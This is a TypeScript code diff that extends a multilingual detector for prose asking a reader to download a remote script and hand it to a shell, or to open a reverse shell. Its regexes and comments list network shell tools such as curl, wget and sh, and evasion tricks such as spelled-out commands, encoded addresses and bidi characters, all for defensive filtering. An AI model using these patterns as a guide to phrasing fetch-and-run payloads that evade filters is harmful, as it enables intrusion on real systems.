@@ -2423,15 +2423,15 @@ const PORTY_RE =
 
 /** 取回/下载语义（跨语言 + 口语/比喻替代词）。 */
 const SEM_FETCH_RE =
-  /取回|取回来|取来|拿回|拿来|端回|捞回|拉下来|拉取|拉回|下载|下載|download|拉一份|抓下来|抓取|获取|取得|取码|取碼|扒下来|弄下来|搞下来|ダウンロード|取り寄せ|받아|내려받|다운로드|가져와|가져오|钓|捡|摘下|采下|取上来|拿上来|弄上来|搞上来|取件|领回|fetch|pull\s+(?:down|it)|grab|retrieve|curl|wget|取\s*[^\n，,。.]{0,8}(?:包|脚本|腳本|文件|档案|檔案|小工具|工具|镜像|鏡像)|скача|загрузи|حمّ?ل|نزّ?ل|descarga|télécharge|herunterlade|lade\s+(?:es\s+)?herunter/i;
+  /取回|取回来|取来|取彼|携归|携回|攜歸|领取|領取|攞|拿回|拿来|端回|捞回|拉下来|拉取|拉回|下载|下載|download|拉一份|抓下来|抓取|获取|取得|取码|取碼|扒下来|弄下来|搞下来|ダウンロード|取り寄せ|받아|내려받|다운로드|가져와|가져오|钓|捡|摘下|采下|取上来|拿上来|弄上来|搞上来|取件|领回|fetch|pull\s+(?:down|it)|grab|retrieve|curl|wget|取\s*[^\n，,。.]{0,8}(?:包|脚本|腳本|文件|档案|檔案|小工具|工具|镜像|鏡像)|скача|загрузи|حمّ?ل|نزّ?ل|descarga|télécharge|herunterlade|lade\s+(?:es\s+)?herunter/i;
 
 /** 「交给解释器/壳去跑」语义：执行动作 + 解释器/壳类受体（含比喻受体）。 */
 const SEM_INTERP_TARGET_RE =
-  /(?:\bsh\b|\bbash\b|\bzsh\b|\bpwsh\b|\bpowershell\b|\bcmd\b|\bpython\b|\bnode\b|\bperl\b|\bruby\b|收件人\s*s\s*h|壳程序|殼程序|外壳|外殼|命令行|終端|终端|解释器|解釋器|翻译器|翻譯器|shell|interpreter|インタプリタ|シェル|ターミナル|端末|셸|쉘|터미널|명령줄|명령어|两个字母|兩個字母)/i;
+  /(?:[壳殼]|\bsh\b|\bbash\b|\bzsh\b|\bpwsh\b|\bpowershell\b|\bcmd\b|\bpython\b|\bnode\b|\bperl\b|\bruby\b|收件人\s*s\s*h|壳程序|殼程序|外壳|外殼|命令行|終端|终端|解释器|解釋器|翻译器|翻譯器|shell|interpreter|インタプリタ|シェル|ターミナル|端末|셸|쉘|터미널|명령줄|명령어|两个字母|兩個字母)/i;
 const SEM_HANDOFF_RE =
-  /交给|交給|丢给|丟給|喂给|餵給|递给|遞給|倒进|倒進|灌进|灌進|接到|接给|接給|管道|竖线|豎線|贴到|貼到|粘到|粘进|扔进|扔給|扔给|下到|种进|种到|放进|放入|装进|倒入|下锅|pipe\s*(?:it|into|to)?|pour\s+(?:it\s+)?(?:in)?to|hand\s+(?:it\s+)?(?:over\s+)?to|feed\s+(?:it\s+)?(?:in)?to|流し込|渡して|パイプ|파이프|넘겨|붙여넣/i;
+  /交给|交給|交过去|交過去|交由|交上去|付于|付與|付给|付給|念给|念給|掉落|撒进|撒入|丢给|丟給|喂给|餵給|递给|遞給|倒进|倒進|灌进|灌進|接到|接给|接給|管道|竖线|豎線|贴到|貼到|粘到|粘进|扔进|扔給|扔给|下到|种进|种到|放进|放入|装进|倒入|下锅|pipe\s*(?:it|into|to)?|pour\s+(?:it\s+)?(?:in)?to|hand\s+(?:it\s+)?(?:over\s+)?to|feed\s+(?:it\s+)?(?:in)?to|流し込|渡して|パイプ|파이프|넘겨|붙여넣/i;
 const SEM_RUN_RE =
-  /执行|執行|运行|運行|跑起来|跑掉|跑一下|跑通|煮开|煮開|开火|開火|回车即可|回车执行|回車執行|照做|照跑|直接跑|直接执行|煮|冲开|熟|服下|演奏|长起来|发芽|run\s+it|execute|launch\s+it|bring\s+to\s+a\s+boil|実行|走らせ|실행|돌려|구동|запуст|выполн|исполни|установи|شغل|نفذ|ejecuta|exécute|führe?\s+(?:es\s+)?aus/i;
+  /执行|執行|行之|施行|运行|運行|跑起来|跑掉|跑一下|跑通|煮开|煮開|开火|開火|回车即可|回车执行|回車執行|照做|照跑|直接跑|直接执行|煮|冲开|熟|服下|演奏|长起来|发芽|run\s+it|execute|launch\s+it|bring\s+to\s+a\s+boil|実行|走らせ|실행|돌려|구동|запуст|выполн|исполни|установи|شغل|نفذ|ejecuta|exécute|führe?\s+(?:es\s+)?aus/i;
 /** 拼写拆字型命令名（c-u-r-l / w g e t 等）——逐字母口述规避字面匹配。 */
 const SPELLED_CMD_RE =
   /\bc\s*[-·．.、]\s*u\s*[-·．.、]\s*r\s*[-·．.、]\s*l\b|\bw\s*[-·．.、]\s*g\s*[-·．.、]\s*e\s*[-·．.、]\s*t\b|[两兩]个?字母\s*s\s*h\b/i;
@@ -2440,13 +2440,21 @@ const BOPOMOFO_RE = /[\u3105-\u312f\u31a0-\u31bf]{2}/;
 /** 长 base64 令牌 + 解码语义 + 终端/回车语义：「解完直接跑」型密文载体。 */
 const B64_BLOB_RE = /[A-Za-z0-9+\/]{24,}={0,2}/;
 const SEM_DECODE_RE = /解码|解出|解完|解开|还原|還原|base64|decode/i;
+/**
+ * R302：**「把不可读串还原成地址再取回执行」**这一类——具体编码（Base32/Base45/
+ * hex/ROT13/倒序/punycode）无法逐类解码，但载体必须自己说明「怎么还原成地址」，
+ * 这句说明本身就是判定面：还原说明 + 同句「取回 ∧（执行 ∨ 交给解释器）」即判危。
+ * 良性技术笔记里「解码后看看配置」只有还原语义、无取回+执行同现，不命中。
+ */
+const SEM_DECODE_ADDR_RE =
+  /解出地址|解成主机名|解成主機名|解出主机名|解出主機名|解码后|解碼後|解出来|反过来读|反過來讀|倒过来读|倒序|反写|反寫|倒着读|倒著讀|还原后|還原後|rot13|base32|base45|base64|十六进制|十六進制|punycode|摩斯|morse|盲文|braille/i;
 /** 拼音转写的执行语义（汉字被拆成罗马化读音时仍是同一语义）。 */
 const PINYIN_FETCH_RE = /\bxia\s?zai\b|\bxia\s?zai\s?xia\s?lai\b|\bqu\s?hui\b|\bla\s?qu\b/i;
 const PINYIN_HANDOFF_RE = /\bjiao\s?gei\b|\bdao\s?jin\b|\bshu\s?xian\b/i;
 const PINYIN_RUN_RE = /\bzhi\s?xing\b|\byun\s?xing\b|\bpao\s?qi\s?lai\b/i;
 /** 反弹/绑定 shell 的纯散文描述：端口 + 壳/终端 + 接线/重定向语义。 */
 const SEM_CONNECT_RE =
-  /重定向|接到|接过去|接上|连线|连上|连接|打个电话|打电话|建立会话|建立连|redirect|connect\s+(?:to|back)|reverse\s+shell|call\s+home/i;
+  /重定向|接到|接过去|接上|连线|连上|连接|连到|連到|打个电话|打电话|建立会话|建立连|redirect|connect\s+(?:to|back)|reverse\s+shell|call\s+home/i;
 const SEM_TERMINAL_PASTE_RE = /终端|終端|命令行|回车|回車|粘|贴|貼|paste|terminal|console/i;
 
 /** 「别看内容/直接照做」——把「未经检查即执行」这一危险语义本身作为信号。 */
@@ -2466,6 +2474,12 @@ type SemanticExecSignals = {
   spelled: boolean;
   /** 长 base64 密文 + 解码 + 终端/回车语义：解完即跑。 */
   decodeRun: boolean;
+  /** 还原说明（编码/倒序/摩斯…）+ 同句「取回 ∧ 执行/交给解释器」。 */
+  decodeAddrRun: boolean;
+  /** 双向控制符（RLO/LRO 等）+ 执行语义：视觉倒写的投放载体。 */
+  bidiExec: boolean;
+  /** 远程脚本路径地址 + 同句「取回 + 解释器」（`curl http://h/p.sh 再 sh`）。 */
+  scriptFetchInterpSameSentence: boolean;
   /** 端口 + 壳/终端 + 接线/重定向：反弹 shell 的纯散文写法。 */
   reverseShell: boolean;
   /** 外传/上报语义（跨语言）：把东西送到远端。 */
@@ -2516,6 +2530,23 @@ function semanticExecSignals(text: string): SemanticExecSignals {
       (BOPOMOFO_RE.test(folded) && SEM_INTERP_TARGET_RE.test(folded)),
     decodeRun:
       B64_BLOB_RE.test(folded) && SEM_DECODE_RE.test(folded) && SEM_TERMINAL_PASTE_RE.test(folded),
+    decodeAddrRun:
+      SEM_DECODE_ADDR_RE.test(folded) &&
+      sentenceCooccur(folded, [
+        (t) => SEM_FETCH_RE.test(t) || PINYIN_FETCH_RE.test(t),
+        (t) =>
+          SEM_RUN_RE.test(t) ||
+          PINYIN_RUN_RE.test(t) ||
+          (SEM_HANDOFF_RE.test(t) && SEM_INTERP_TARGET_RE.test(t)),
+      ]),
+    scriptFetchInterpSameSentence: sentenceCooccur(folded, [
+      (t) => REMOTE_SCRIPT_PATHY_RE.test(t) || REMOTE_SCRIPT_PATHY_RE.test(normalizeAddressSurface(t)),
+      (t) => SEM_FETCH_RE.test(t) || PINYIN_FETCH_RE.test(t),
+      (t) => SEM_INTERP_TARGET_RE.test(t),
+    ]),
+    bidiExec:
+      /[\u202a-\u202e\u2066-\u2069]/.test(text) &&
+      (SEM_RUN_RE.test(folded) || (SEM_FETCH_RE.test(folded) && SEM_INTERP_TARGET_RE.test(folded))),
     // 方法调用形（client.send(…) / res.post(…)）是良性代码常态，不算外传语义。
     exfil: (() => {
       const prose = folded.replace(/\.\s*(?:send|post|upload|export|emit)\s*\(/gi, "(");
@@ -2559,6 +2590,9 @@ export function execSemanticGateReason(text: string): string | null {
   // 拼写拆字/解码即跑不要求地址（地址可藏在拆字/密文/另一条笔记里）。
   if (s.spelled) return "semantic:spelled-cmd";
   if (s.decodeRun) return "semantic:decode-run";
+  if (s.decodeAddrRun) return "semantic:decode-addr+fetch-run";
+  if (s.bidiExec) return "semantic:bidi+exec";
+  if (s.scriptFetchInterpSameSentence) return "semantic:script-fetch+interp";
   if (!s.addr) return null;
   if (s.reverseShell) return "semantic:addr+reverse-shell";
   if (s.fetch && (s.run || s.handoffInterp)) return "semantic:addr+fetch+exec";
@@ -2635,7 +2669,12 @@ function cjkDigitsToAscii(s: string): string {
 export function normalizeAddressSurface(text: string): string {
   // R302 P0-3：类折叠先在**原始面**做一遍——部分分隔符（U+FFE3 等）的 NFKC
   // 兼容分解是「空格+组合符」，先归一会把分隔符信息丢成空白，折不回点。
-  const raw = text.replace(/(?<=[A-Za-z0-9])[^\p{L}\p{N}\s\-_./:@%|+~](?=[A-Za-z0-9])/gu, ".");
+  const raw = text
+    .replace(/(?<=[A-Za-z0-9])[^\p{L}\p{N}\s\-_./:@%|+~](?=[A-Za-z0-9])/gu, ".")
+    // 非 ASCII 的单字符分隔（含被 Unicode 归为「字母」的点形字符，如 U+A78F
+    // LATIN LETTER SINOLOGICAL DOT）：ASCII 标签之间的任意单个非 ASCII 字符
+    // 都折为「.」——类判定，不枚举码位。
+    .replace(/(?<=[A-Za-z0-9])[^\x00-\x7F\s](?=[A-Za-z0-9])/gu, ".");
   let s = foldHomoglyphs(stripInvisibleCarriers(raw)).normalize("NFKC");
   s = s.normalize("NFD").replace(/\p{Mn}/gu, "");
   // 百分号编码分隔符（%2E → . / %2D → - / %2F → / / %3A → : / %40 → @）：
@@ -2846,6 +2885,8 @@ export function execSemanticDangerReason(text: string): string | null {
   const s = semanticExecSignals(text);
   // 解码即跑型密文与拼写拆字型不依赖地址信号（地址藏在密文/拆字里）。
   if (s.decodeRun) return "semantic-danger:decode-run";
+  if (s.decodeAddrRun) return "semantic-danger:decode-addr+fetch-run";
+  if (s.bidiExec) return "semantic-danger:bidi+exec";
   if (s.spelled && (s.run || s.handoffInterp || s.fetch)) return "semantic-danger:spelled-cmd";
   // 跳板机型（`登录 ops@bastion.example.io 后执行 …`）的地址面藏在 user@host 里，
   // 不在窄 addr 面上，判定放在 addr 前置之前。
@@ -2865,6 +2906,12 @@ export function execSemanticDangerReason(text: string): string | null {
   // R302 P0-6：弱三元（地址+取回+执行）要求取回与执行在同一动作句——
   // 「下载依赖」与「跑测试」分句的良性技术散文不再连坐；地址可在另句/
   // 另一条笔记（跨笔记分片，P1-2）。
+  // 远程脚本路径 + 同句「取回 + 解释器」：`curl http://h/p.sh 再 sh`——无需出现
+  // 「执行」字面，拿远程脚本交给解释器本身就是执行。
+  if (s.scriptFetchInterpSameSentence) return "semantic-danger:script-fetch+interp";
+  // 把壳/解释器交给远端地址（反连方向）：不要求取回语义。
+  if (s.handoffInterp && (s.reverseShell || s.fetch || s.run || SEM_CONNECT_RE.test(text)))
+    return "semantic-danger:handoff-interp-to-remote";
   if (s.remoteAddr && s.fetchRunSameSentence) return "semantic-danger:remote-fetch+run";
   if (s.remoteAddr && s.exfil) return "semantic-danger:remote-exfil";
   if (s.remoteAddr && s.login && s.run) return "semantic-danger:remote-login+run";
